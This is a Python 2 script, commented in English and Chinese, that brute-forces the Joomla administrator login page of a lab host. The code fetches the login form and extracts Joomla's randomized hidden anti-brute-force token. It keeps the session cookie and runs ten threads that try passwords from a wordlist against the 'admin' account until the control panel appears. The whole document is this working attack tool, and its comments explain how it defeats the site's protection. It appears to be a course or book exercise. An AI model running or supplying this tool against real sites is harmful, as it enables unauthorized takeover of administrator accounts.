#-*-coding:utf-8-*-
'''
以下一段HTML最后4行可以看到 input 的type为 hidden，我们无法获得，但是通过 javascript 可以获得
而我们的Python这个脚本不在本域，无法获取这些值，而这些值又是随机的，可以唯一定位一个 session
所以我们不需要管这些，只需要在post出去的时候修改 username 和 passwd 就可以了

<form action="/administrator/index.php" method="post" id="form-login"
class="form-inline">

<input name="username" tabindex="1" id="mod-login-username" type="text"
class="input-medium" placeholder="User Name" size="15"/>

<input name="passwd" tabindex="2" id="mod-login-password" type="password"
class="input-medium" placeholder="Password" size="15"/>

<select id="lang" name="lang" class="inputbox advancedSelect">
    <option value="" selected="selected">Language-Default</option>
    <option value="en-GB">English (United Kingdom)</option>
</select>

<input type="hidden" name="option" value="com_login"/>
<input type="hidden" name="task" value="login"/>
<input type="hidden" name="return" value="aW5kZXgucGhw"/>
<input type="hidden" name="12335343439743947394395834" value="1">
-------------------------------------------------------------------------
# the last hidden field, you'll sell that its name attribute is set to a long,randomized string.This is the essential
# piece of Joomla's anti-brute-forcing technique.That randomized stirng is checked against your current user session
# stored in a cookie,and even if you are passing the correct credentials into the login processing script,if the randomized
# token is not present the authentication will fail.
'''

import urllib2 
import urllib
import cookielib
import threading
import sys
import Queue



from HTMLParser import HTMLParser

# general settings
user_thread   = 10
username      = "admin"
wordlist_file = "/tmp/cain.txt"
resume        = None

# target specific settings
target_url    = "http://192.168.112.131/administrator/index.php" # first download and parse the HTML
target_post   = "http://192.168.112.131/administrator/index.php" # submit our brute-forcing attempt

username_field= "username"
password_field= "passwd"

success_check = "Administration - Control Panel"   # we'll check for after each brute-forcing attempt in order to determine whether
                                                   # we are successful or not.


class BruteParser(HTMLParser):
    
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    # when we call the feed function,it passes in the entire HTML document and our handle_starttag function is called whenever a tag is
    # encountered.In particular,we're looking for HTML input tags and our main processing occurs when we determine that we have found one.
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name  = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            
            if tag_name is not None:
                self.tag_results[tag_name] = value
'''
上面函数将所有 name value 做成字典，只要有 name 就可以了,所以解析之后会得到下列字典
tag_results{username:, passwd:, option:com_login, task:login, return:aW5kZXgucGhw, 12335..:1}


<input type="hidden" name="option" value="com_login"/>
<input type="hidden" name="task" value="login"/>
<input type="hidden" name="return" value="aW5kZXgucGhw"/>
<input type="hidden" name="12335343439743947394395834" value="1">
'''

class Bruter(object):
    def __init__(self, username, words):
        
        self.username   = username
        self.password_q = words
        self.found      = False
        
        print "Finished setting up for: %s" % username
        
    def run_bruteforce(self):
        
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()
    
    def web_bruter(self):
        
        while not self.password_q.empty() and not self.found:
            brute  = self.password_q.get().rstrip()
            jar    = cookielib.FileCookieJar("cookies") # we setup our cookie jar using the FileCookieJar class that will store
                                                        # cookies in the cookies file
                                                        
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            # we initialize our urllib2 opener,passing in the initialized cookie jar,which tells urllib2 to pass off any cookies
            # to it.we then make the initial request to retrieve the login form.
            
            response = opener.open(target_url)
            
            page = response.read()
            
            print "Trying: %s : %s (%d left)" % (self.username,brute,self.password_q.qsize())

            # parse out the hidden fields
            parser = BruteParser()  # 这是一个类，when we have the raw HTML,we pass it off to our HTML parser and call its feed method
                                    # which returns a dictionary of all of the retrieved form elements.
            parser.feed(page)     
            
            post_tags = parser.tag_results
            
            # add our username and password fields
            # after we have successfully parsed the HTML,we replace the username and password fileds with our brute-forcing attempt.
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            # 上面两句完成之后，就将HTML中所有的 input 标签里面的 value 替换掉了
            # 如果构造返回页面需要的话，就完全可以从这个字典里面来取值了
            # we URL encode the POST variables,and then pass them in our subsequent HTTP request.
            login_data     = urllib.urlencode(post_tags)    #通过上面的字典，先替换掉，再编码，然后发送给服务器端
            login_response = opener.open(target_post, login_data)

            # after we retrieve the result of our authentication attempt,we test whether the authentication was successful or not
            login_result   = login_response.read()
            
            
            if success_check in login_result:
                self.found = True
                
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."

def build_wordlist(wordlist_file):

    # read in the word list
    fd = open(wordlist_file,"rb") 
    raw_words = fd.readlines()
    fd.close()
    
    found_resume = False
    words        = Queue.Queue()
    
    for word in raw_words:
        
        word = word.rstrip()
        
        if resume is not None:
            
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume
                                        
        else:
            words.put(word)
    
    return words            

words = build_wordlist(wordlist_file)       # 把字典放入队列中


bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()

